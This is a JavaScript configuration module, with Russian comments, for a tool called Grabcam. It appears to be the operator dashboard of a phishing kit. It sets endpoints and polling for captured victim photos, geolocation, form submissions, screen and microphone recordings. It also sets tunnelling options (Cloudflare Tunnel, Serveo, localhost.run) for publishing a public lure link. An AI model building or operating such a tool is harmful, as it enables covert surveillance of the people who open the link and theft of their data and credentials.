/**
 * Grabcam — модуль конфигурации (API, лимиты, интервалы опроса).
 * Автор инструмента: ERRORoX
 */
export const TOOL_ID = "grabcam";
export const LAYOUT_STORAGE_KEY = "grabcam-panel-layout";
export const MIN_SPAN = 1;
export const MAX_SPAN = 4;

export const API = {
  options: "/api/tools/grabcam/options",
  runStatus: "/api/tools/grabcam/run-status",
  diagnostics: "/api/analytics/diagnostics",
  stop: "/api/tools/grabcam/stop",
  photos: "/api/tools/grabcam/photos",
  locations: "/api/tools/grabcam/locations",
  formCaptures: "/api/tools/grabcam/form-captures",
  screen: "/api/tools/grabcam/screen",
  audio: "/api/tools/grabcam/audio",
  export: "/api/tools/grabcam/export",
};

export const LIMITS = {
  photos: 12,
  screen: 8,
  audio: 30,
  formCaptures: 100,
  summaryPhotos: 5,
  summaryLocations: 50,
  summaryScreen: 10,
  summaryAudio: 10,
};

export const POLL_INTERVALS = {
  status: 2000,
  photos: 4000,
  locations: 6000,
  formCaptures: 5000,
  screen: 5000,
  audio: 6000,
  summary: 8000,
  sessionStats: 6000,
};

export const POLL_IDS = {
  status: null,
  photos: null,
  locations: null,
  formCaptures: null,
  screen: null,
  audio: null,
  summary: null,
  sessionStats: null,
};

export const METHOD_LABELS = {
  php_only: "Локальная сеть",
  localhost_run: "localhost.run",
  cloudflared: "Cloudflare Tunnel",
  serveo: "Serveo",
};

export const METHOD_HINTS = {
  php_only: "Локальный адрес: только этот ПК или устройства в той же сети.",
  localhost_run: "Публичная ссылка (…lhr.life). Нужен SSH. Часто работает в РФ.",
  cloudflared: "Публичная ссылка (…trycloudflare.com). Установите cloudflared — без SSH.",
  serveo: "Публичная ссылка (…serveo.net). Нужен SSH. Может быть недоступен в РФ.",
};

export const FEATURE_IDS = ["gc-feat-camera", "gc-feat-geo", "gc-feat-form", "gc-feat-gallery", "gc-feat-mic", "gc-feat-screen"];
export const FEATURE_KEYS = ["camera", "geo", "form", "gallery", "mic", "screen"];
